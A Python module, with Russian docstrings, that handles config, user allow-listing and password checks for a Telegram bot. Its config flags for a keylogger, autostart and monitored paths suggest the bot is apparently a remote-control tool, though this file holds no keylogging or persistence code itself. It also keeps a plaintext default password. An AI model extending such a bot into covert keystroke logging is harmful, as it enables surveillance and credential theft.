"""
Модуль безопасности для Telegram-бота.
Проверка прав доступа, аутентификация, управление разрешёнными пользователями.
"""

import json
import logging
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

CONFIG_PATH = Path(__file__).parent / "config.json"


def load_config() -> dict:
    """Загрузка конфигурации из JSON файла."""
    try:
        with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
            return json.load(f)
    except FileNotFoundError:
        default_config = {
            "allowed_user_ids": [],
            "password": "change_me",
            "current_directories": {},
            "monitored_paths": [],
            "keylogger_active": False,
            "startup_enabled": False
        }
        save_config(default_config)
        return default_config
    except json.JSONDecodeError as e:
        logger.error(f"Ошибка парсинга config.json: {e}")
        return {}


def save_config(config: dict) -> bool:
    """Сохранение конфигурации в JSON файл."""
    try:
        with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=4, ensure_ascii=False)
        return True
    except Exception as e:
        logger.error(f"Ошибка сохранения config.json: {e}")
        return False


def is_user_allowed(user_id: int) -> bool:
    """
    Проверка, есть ли пользователь в списке разрешённых.

    Args:
        user_id: Telegram ID пользователя

    Returns:
        True если пользователь авторизован (в списке allowed_user_ids)
    """
    config = load_config()
    allowed_ids = config.get("allowed_user_ids", [])
    return user_id in allowed_ids


def add_allowed_user(user_id: int) -> bool:
    """
    Добавление пользователя в список разрешённых.
    
    Args:
        user_id: Telegram ID пользователя
        
    Returns:
        True если успешно добавлен
    """
    config = load_config()
    if user_id not in config.get("allowed_user_ids", []):
        if "allowed_user_ids" not in config:
            config["allowed_user_ids"] = []
        config["allowed_user_ids"].append(user_id)
        return save_config(config)
    return True


def remove_allowed_user(user_id: int) -> bool:
    """
    Удаление пользователя из списка разрешённых.
    
    Args:
        user_id: Telegram ID пользователя
        
    Returns:
        True если успешно удалён
    """
    config = load_config()
    allowed_ids = config.get("allowed_user_ids", [])
    if user_id in allowed_ids:
        config["allowed_user_ids"].remove(user_id)
        return save_config(config)
    return False


def get_allowed_users() -> list:
    """Получение списка разрешённых пользователей."""
    config = load_config()
    return config.get("allowed_user_ids", [])


def verify_password(entered_password: str) -> bool:
    """
    Проверка введённого пароля.
    
    Args:
        entered_password: Пароль, введённый пользователем
        
    Returns:
        True если пароль верный
    """
    config = load_config()
    stored_password = config.get("password", "change_me")
    return entered_password == stored_password


def change_password(new_password: str) -> bool:
    """
    Изменение пароля бота.
    
    Args:
        new_password: Новый пароль
        
    Returns:
        True если успешно изменён
    """
    config = load_config()
    config["password"] = new_password
    return save_config(config)


def get_user_directory(user_id: int) -> str:
    """
    Получение текущей директории для пользователя.
    
    Args:
        user_id: Telegram ID пользователя
        
    Returns:
        Путь к текущей директории
    """
    config = load_config()
    user_dirs = config.get("current_directories", {})
    return user_dirs.get(str(user_id), "")


def set_user_directory(user_id: int, path: str) -> bool:
    """
    Установка текущей директории для пользователя.
    
    Args:
        user_id: Telegram ID пользователя
        path: Путь к директории
        
    Returns:
        True если успешно установлено
    """
    config = load_config()
    if "current_directories" not in config:
        config["current_directories"] = {}
    config["current_directories"][str(user_id)] = path
    return save_config(config)


def is_keylogger_active() -> bool:
    """Проверка статуса кейлоггера."""
    config = load_config()
    return config.get("keylogger_active", False)


def set_keylogger_status(active: bool) -> bool:
    """
    Установка статуса кейлоггера.
    
    Args:
        active: True для включения, False для выключения
        
    Returns:
        True если успешно
    """
    config = load_config()
    config["keylogger_active"] = active
    return save_config(config)


def is_startup_enabled() -> bool:
    """Проверка статуса автозагрузки."""
    config = load_config()
    return config.get("startup_enabled", False)


def set_startup_status(enabled: bool) -> bool:
    """
    Установка статуса автозагрузки.
    
    Args:
        enabled: True для включения, False для выключения
        
    Returns:
        True если успешно
    """
    config = load_config()
    config["startup_enabled"] = enabled
    return save_config(config)


def get_monitored_paths() -> list:
    """Получение списка отслеживаемых путей."""
    config = load_config()
    return config.get("monitored_paths", [])


def add_monitored_path(path: str) -> bool:
    """
    Добавление пути для мониторинга.
    
    Args:
        path: Путь к директории
        
    Returns:
        True если успешно добавлен
    """
    config = load_config()
    if "monitored_paths" not in config:
        config["monitored_paths"] = []
    if path not in config["monitored_paths"]:
        config["monitored_paths"].append(path)
        return save_config(config)
    return False


def remove_monitored_path(path: str) -> bool:
    """
    Удаление пути из мониторинга.
    
    Args:
        path: Путь к директории
        
    Returns:
        True если успешно удалён
    """
    config = load_config()
    monitored = config.get("monitored_paths", [])
    if path in monitored:
        config["monitored_paths"].remove(path)
        return save_config(config)
    return False


def check_access(user_id: int) -> tuple[bool, Optional[str]]:
    """
    Полная проверка доступа пользователя.

    Args:
        user_id: Telegram ID пользователя

    Returns:
        Кортеж (has_access, message)
        has_access: True если доступ разрешён
        message: Сообщение для пользователя если доступ запрещён
    """
    if not is_user_allowed(user_id):
        return False, "🚫 Access Denied! Please use /auth to enter the password."
    return True, None
